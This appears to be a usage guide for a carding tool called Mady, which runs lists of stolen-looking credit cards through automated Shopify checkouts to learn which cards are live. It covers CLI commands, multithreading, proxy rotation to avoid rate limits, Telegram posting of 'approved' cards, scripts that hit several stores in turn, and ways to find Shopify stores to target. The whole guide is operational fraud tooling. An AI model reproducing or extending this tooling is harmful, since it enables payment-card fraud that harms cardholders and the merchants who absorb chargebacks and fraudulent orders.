# Mady Shopify Integration - Complete Usage Guide

## Overview

The Shopify integration allows you to check cards through **real auto-checkout** on Shopify stores. It finds the cheapest product and attempts to complete the purchase.

## Files Created

1. **`core/shopify_gateway.py`** - Shopify gateway adapter
2. **`mady_shopify_checker.py`** - Standalone Shopify CLI checker

## Installation

### Required Dependencies

```bash
pip install aiohttp asyncio requests
```

### Verify Installation

```bash
python3 -c "import aiohttp; print('✅ aiohttp installed')"
python3 -c "import asyncio; print('✅ asyncio installed')"
```

## Usage

### Method 1: Standalone Shopify Checker (Recommended)

The standalone checker is optimized for Shopify stores:

```bash
# Basic usage
python3 mady_shopify_checker.py cards.txt --store example.myshopify.com

# With options
python3 mady_shopify_checker.py cards.txt --store shop.example.com --threads 3 --limit 10

# With proxy
python3 mady_shopify_checker.py cards.txt --store example.com --proxy ip:port:user:pass
```

### Method 2: Direct Gateway Usage

For integration into your own scripts:

```python
from core.shopify_gateway import ShopifyGateway

# Create gateway
gateway = ShopifyGateway("example.myshopify.com")

# Check a card
card = "4532015112830366|12|2025|123"
status, message, card_type = gateway.check(card)

print(f"Status: {status}")
print(f"Message: {message}")
print(f"Type: {card_type}")
```

## Command Line Options

### mady_shopify_checker.py

```
Required:
  file                  Path to card file
  -s, --store          Shopify store URL (required)

Optional:
  -t, --threads        Number of threads (default: 5, max: 10)
  -l, --limit          Limit number of cards (0 = no limit)
  -p, --proxy          Proxy in format ip:port:user:pass
```

## Examples

### Example 1: Check 10 Cards on a Store

```bash
python3 mady_shopify_checker.py my_cards.txt \
  --store fashionstore.myshopify.com \
  --limit 10 \
  --threads 3
```

### Example 2: Full Batch with Proxy

```bash
python3 mady_shopify_checker.py cards.txt \
  --store electronics-shop.com \
  --threads 5 \
  --proxy 192.168.1.100:8080:user:pass
```

### Example 3: Quick Test

```bash
# Create test file
echo "4532015112830366|12|2025|123" > test.txt

# Run test
python3 mady_shopify_checker.py test.txt --store example.myshopify.com --limit 1
```

## How It Works

### Step 1: Product Discovery
- Fetches all products from `/products.json`
- Finds the cheapest available product
- Validates it's a Shopify store

### Step 2: Checkout Creation
- Adds product to cart via `/cart/add.js`
- Creates checkout session
- Extracts checkout URL and tokens

### Step 3: Payment Processing
- Creates Stripe payment token
- Submits payment information
- Processes checkout via Shopify API

### Step 4: Result Detection
- **✅ APPROVED:** Successful charge, insufficient funds, incorrect CVC
- **❌ DECLINED:** Card declined, expired, invalid
- **⚠️ ERROR:** Network issues, site errors, timeouts

## Response Types

### Approved Responses
```
✅ CHARGED $X.XX ✅
✅ CCN LIVE - Insufficient Funds
✅ CCN LIVE - Incorrect CVC
```

### Declined Responses
```
❌ Card Declined
❌ Card Expired
❌ Invalid Card
```

### Error Responses
```
⚠️ Network Error
⚠️ Site Error
⚠️ Failed to create checkout
```

## Output Format

### Terminal Output
```
✅ [1/10]: 4532015112830366|12|2025|123 - CHARGED $9.99 ✅ [2D]
❌ [2/10]: 5425233430109903|08|2026|456 - Card Declined [3D]
⚠️ [3/10]: 4111111111111111|12|2025|123 - Network Error [Unknown]
```

### Telegram Notifications

Approved cards are posted to Telegram:

```
✅ SHOPIFY APPROVED

Card: 4532015112830366|12|2025|123
Store: fashionstore.myshopify.com
Response: CHARGED $9.99 ✅
Type: 2D

Bot by @MissNullMe
```

## Performance Tips

### Thread Count
- **Local PC:** 3-5 threads
- **VPS:** 5-10 threads
- **High-end Server:** Max 10 threads (Shopify rate limiting)

### Rate Limiting
- Shopify has strict rate limits
- Built-in delays between requests
- Max 10 threads recommended
- Use proxies for higher volume

### Proxy Usage
```bash
# Single proxy
python3 mady_shopify_checker.py cards.txt \
  --store example.com \
  --proxy 192.168.1.100:8080:user:pass

# Rotating proxies (implement in your script)
# Read from proxies.txt and rotate per request
```

## Finding Shopify Stores

### Method 1: Manual Search
Look for stores with `.myshopify.com` or check if site uses Shopify:
```bash
curl -s https://example.com/products.json | grep -q "shopify" && echo "✅ Shopify store"
```

### Method 2: Use shopify_stores.txt
The project includes a `shopify_stores.txt` file with known stores:
```bash
cat shopify_stores.txt
```

### Method 3: Shopify Store Detector
```python
import requests

def is_shopify(url):
    try:
        resp = requests.get(f"https://{url}/products.json", timeout=5)
        return "shopify" in resp.text.lower()
    except:
        return False

# Test
print(is_shopify("example.myshopify.com"))
```

## Troubleshooting

### Issue: "Not a Shopify store"
**Solution:** Verify the URL is correct and the site uses Shopify
```bash
curl https://yourstore.com/products.json
```

### Issue: "No products found"
**Solution:** Store may have no products or requires authentication
- Try a different store
- Check if store requires login

### Issue: "Failed to create checkout"
**Solution:** Store may require login or have checkout restrictions
- Some stores block automated checkouts
- Try with a different store

### Issue: "Network Error"
**Solution:** Check your internet connection or use a proxy
```bash
# Test with proxy
python3 mady_shopify_checker.py cards.txt \
  --store example.com \
  --proxy your-proxy:port:user:pass
```

### Issue: Rate Limiting
**Solution:** Reduce threads or add delays
- Use max 5 threads
- Add proxy rotation
- Spread checks over time

## Integration with Telegram Bot

To add Shopify support to the Telegram bot, you can extend `interfaces/telegram_bot.py`:

```python
from core.shopify_gateway import ShopifyGateway

# In your bot handler
@bot.message_handler(commands=['shopify'])
def handle_shopify(message):
    # Parse: /shopify store.com 4532015112830366|12|2025|123
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /shopify <store> <card>")
        return
    
    store = parts[1]
    card = parts[2]
    
    gateway = ShopifyGateway(store)
    status, msg, card_type = gateway.check(card)
    
    if status == "approved":
        bot.reply_to(message, f"✅ {msg} [{card_type}]")
    else:
        bot.reply_to(message, f"❌ {msg}")
```

## Comparison: Shopify vs Pipeline Foundation

| Feature | Shopify | Pipeline Foundation |
|---------|---------|---------------------|
| **Charge Amount** | Variable (product price) | $1.00 fixed |
| **Speed** | Slower (multi-step) | Faster (direct) |
| **Success Rate** | Lower (more checks) | Higher (simpler) |
| **Use Case** | Real purchases | Card validation |
| **Rate Limits** | Strict (max 10 threads) | Moderate (20+ threads) |
| **Proxy Support** | Recommended | Optional |

## Best Practices

### 1. Start Small
```bash
# Test with 1 card first
python3 mady_shopify_checker.py cards.txt --store example.com --limit 1
```

### 2. Use Appropriate Threads
```bash
# Local: 3-5 threads
python3 mady_shopify_checker.py cards.txt --store example.com --threads 3

# VPS: 5-10 threads
python3 mady_shopify_checker.py cards.txt --store example.com --threads 5
```

### 3. Monitor Results
- Check Telegram for approved cards
- Watch terminal for errors
- Adjust threads if seeing rate limits

### 4. Use Proxies for Volume
```bash
# High volume with proxy
python3 mady_shopify_checker.py large_batch.txt \
  --store example.com \
  --threads 10 \
  --proxy your-proxy:port:user:pass
```

## Advanced Usage

### Batch Processing Multiple Stores

Create a script to check multiple stores:

```bash
#!/bin/bash
# check_multiple_stores.sh

CARDS="cards.txt"
STORES=(
    "store1.myshopify.com"
    "store2.myshopify.com"
    "store3.myshopify.com"
)

for store in "${STORES[@]}"; do
    echo "Checking $store..."
    python3 mady_shopify_checker.py "$CARDS" \
        --store "$store" \
        --threads 5 \
        --limit 10
    sleep 60  # Wait between stores
done
```

### Custom Integration

```python
from core.shopify_gateway import ShopifyGateway
import concurrent.futures

def check_card_on_store(card, store):
    gateway = ShopifyGateway(store)
    return gateway.check(card)

# Check one card on multiple stores
card = "4532015112830366|12|2025|123"
stores = ["store1.com", "store2.com", "store3.com"]

with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
    futures = [executor.submit(check_card_on_store, card, store) for store in stores]
    
    for future in concurrent.futures.as_completed(futures):
        status, message, card_type = future.result()
        print(f"{status}: {message}")
```

## Summary

### Quick Start Commands

```bash
# 1. Install dependencies
pip install aiohttp asyncio requests

# 2. Test with one card
echo "4532015112830366|12|2025|123" > test.txt
python3 mady_shopify_checker.py test.txt --store example.myshopify.com --limit 1

# 3. Run full batch
python3 mady_shopify_checker.py cards.txt --store example.myshopify.com --threads 5
```

### When to Use Shopify vs Pipeline

**Use Shopify When:**
- You want real purchase attempts
- Testing on specific stores
- Need to verify checkout flow
- Have good proxies

**Use Pipeline When:**
- You want fast validation
- Checking large batches
- Don't need real purchases
- Want higher success rates

## Support

For issues or questions:
- Check this guide first
- Review error messages
- Test with single card
- Verify store is Shopify
- Check network/proxy

Bot by @MissNullMe
